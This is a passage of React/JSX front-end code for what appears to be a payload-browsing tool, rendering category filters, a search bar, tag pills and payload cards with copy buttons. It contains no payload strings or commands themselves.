        <div style={{ height: 1, background: "rgba(255,255,255,0.04)" }} />

        {/* Category buttons */}
        <div style={{ padding: "8px 0", flex: 1, overflow: "auto" }}>
          <button
            onClick={() => {
              setActiveCat(null);
              setActiveTag(null);
            }}
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              width: "100%",
              padding: "10px 16px",
              border: "none",
              cursor: "pointer",
              background: !activeCat ? "rgba(110,231,183,0.06)" : "transparent",
              borderLeft: !activeCat
                ? "2px solid #6EE7B7"
                : "2px solid transparent",
              transition: "background 100ms",
            }}
          >
            <span
              style={{
                fontFamily: mono,
                fontSize: 12,
                fontWeight: !activeCat ? 600 : 400,
                color: !activeCat ? "#E2E8F0" : "#9CA3AF",
              }}
            >
              All Payloads
            </span>
            <span
              style={{
                fontFamily: mono,
                fontSize: 10,
                color: "#4B5563",
                background: "rgba(255,255,255,0.04)",
                padding: "2px 7px",
                borderRadius: 4,
              }}
            >
              {PAYLOADS.length}
            </span>
          </button>

          {Object.entries(CATEGORY_META).map(([key, meta]) => {
            const Icon = meta.icon;
            const active = activeCat === key;
            return (
              <button
                key={key}
                onClick={() => {
                  setActiveCat(active ? null : key);
                  setActiveTag(null);
                }}
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  width: "100%",
                  padding: "10px 16px",
                  border: "none",
                  cursor: "pointer",
                  background: active ? `${meta.color}0C` : "transparent",
                  borderLeft: active
                    ? `2px solid ${meta.color}`
                    : "2px solid transparent",
                  transition: "background 100ms",
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 9 }}>
                  <Icon
                    size={13}
                    style={{ color: active ? meta.color : "#4B5563" }}
                  />
                  <span
                    style={{
                      fontFamily: mono,
                      fontSize: 12,
                      fontWeight: active ? 600 : 400,
                      color: active ? "#E2E8F0" : "#9CA3AF",
                    }}
                  >
                    {meta.label}
                  </span>
                </div>
                <span
                  style={{
                    fontFamily: mono,
                    fontSize: 10,
                    color: active ? meta.color : "#4B5563",
                    background: active
                      ? `${meta.color}12`
                      : "rgba(255,255,255,0.04)",
                    padding: "2px 7px",
                    borderRadius: 4,
                  }}
                >
                  {counts[key] || 0}
                </span>
              </button>
            );
          })}
        </div>

        <div
          style={{
            padding: "12px 16px",
            borderTop: "1px solid rgba(255,255,255,0.04)",
            fontFamily: mono,
            fontSize: 10,
            color: "#3B4252",
          }}
        >
          {filtered.length} result{filtered.length !== 1 ? "s" : ""}
        </div>
      </div>

      {/* ── Main panel ── */}
      <div
        style={{
          flex: 1,
          display: "flex",
          flexDirection: "column",
          minWidth: 0,
          gap: 12,
        }}
      >
        {/* Search bar */}
        <div
          style={{
            display: "flex",
            alignItems: "center",
            gap: 10,
            background: "#11151E",
            border: "1px solid rgba(255,255,255,0.04)",
            borderRadius: 10,
            padding: "10px 16px",
          }}
        >
          <Search size={14} style={{ color: "#4B5563", flexShrink: 0 }} />
          <input
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Search payloads, tags, categories..."
            style={{
              background: "transparent",
              border: "none",
              outline: "none",
              width: "100%",
              fontFamily: mono,
              fontSize: 12,
              color: "#E2E8F0",
            }}
          />
          {search && (
            <button
              onClick={() => setSearch("")}
              style={{
                background: "none",
                border: "none",
                cursor: "pointer",
                fontFamily: mono,
                fontSize: 11,
                color: "#4B5563",
                padding: "2px 6px",
              }}
            >
              clear
            </button>
          )}
        </div>

        {/* Tag filter pills */}
        {allTags.length > 0 && (
          <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
            {allTags.map((tag) => {
              const active = activeTag === tag;
              return (
                <button
                  key={tag}
                  onClick={() => setActiveTag(active ? null : tag)}
                  style={{
                    padding: "3px 10px",
                    borderRadius: 6,
                    border: "none",
                    cursor: "pointer",
                    fontFamily: mono,
                    fontSize: 10,
                    fontWeight: 500,
                    background: active
                      ? "rgba(110,231,183,0.12)"
                      : "rgba(255,255,255,0.03)",
                    color: active ? "#6EE7B7" : "#6B7280",
                    transition: "all 100ms",
                  }}
                >
                  <Tag
                    size={9}
                    style={{ marginRight: 4, verticalAlign: "-1px" }}
                  />
                  {tag}
                </button>
              );
            })}
          </div>
        )}

        {/* Payload cards */}
        <div
          style={{
            flex: 1,
            overflow: "auto",
            display: "flex",
            flexDirection: "column",
            gap: 8,
          }}
        >
          {filtered.map((p) => {
            const meta = CATEGORY_META[p.cat];
            return (
              <Card key={p.id} style={{ padding: 0, overflow: "hidden" }}>
                <div
                  style={{
                    padding: "12px 16px 10px",
                    display: "flex",
                    alignItems: "flex-start",
                    justifyContent: "space-between",
                    gap: 12,
                  }}
                >
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: 8,
                      flexWrap: "wrap",
                      minWidth: 0,
                    }}
                  >
                    {/* Category badge */}
                    <span
                      style={{
                        padding: "2px 8px",
                        borderRadius: 4,
                        fontFamily: mono,
                        fontSize: 10,
                        fontWeight: 700,
                        background: `${meta.color}15`,
                        color: meta.color,
                        flexShrink: 0,
                        letterSpacing: "0.03em",
                      }}
                    >
                      {meta.label}
                    </span>
                    {/* Tag pills */}
                    {p.tags.map((t) => (
                      <span
                        key={t}
                        style={{
                          padding: "1px 7px",
                          borderRadius: 4,
                          fontFamily: mono,
                          fontSize: 9,
                          fontWeight: 500,
                          background: "rgba(255,255,255,0.04)",
                          color: "#6B7280",
                        }}
                      >
                        {t}
                      </span>
                    ))}
                  </div>
                  <CopyButton text={substitute(p.payload)} />
                </div>

                {/* Payload code block */}
                <div
                  style={{
                    margin: "0 12px",
                    background: "#0B0F18",
                    borderRadius: 8,
                    padding: 14,
                    overflow: "auto",
                  }}
                >
                  <code
                    style={{
                      fontFamily: mono,
                      fontSize: 12,
                      color: "#E2E8F0",
                      lineHeight: 1.6,
                      whiteSpace: "pre-wrap",
                      wordBreak: "break-all",
                    }}
                  >
                    {substitute(p.payload)}
                  </code>
                </div>

                {/* Description */}
                <div
                  style={{
                    padding: "8px 16px 12px",
                    fontFamily: heading,
                    fontSize: 11,
                    color: "#9CA3AF",
                  }}
                >
                  {p.desc}
                </div>
              </Card>
            );
          })}

          {filtered.length === 0 && (
            <div
              style={{
                flex: 1,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                flexDirection: "column",
                gap: 8,
              }}
            >
              <Shield size={40} strokeWidth={1} style={{ color: "#1F2937" }} />
              <span
                style={{ fontFamily: heading, fontSize: 13, color: "#4B5563" }}
              >
                No payloads found
              </span>
              <span
                style={{ fontFamily: mono, fontSize: 10, color: "#374151" }}
              >
                Try a different search or category
              </span>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
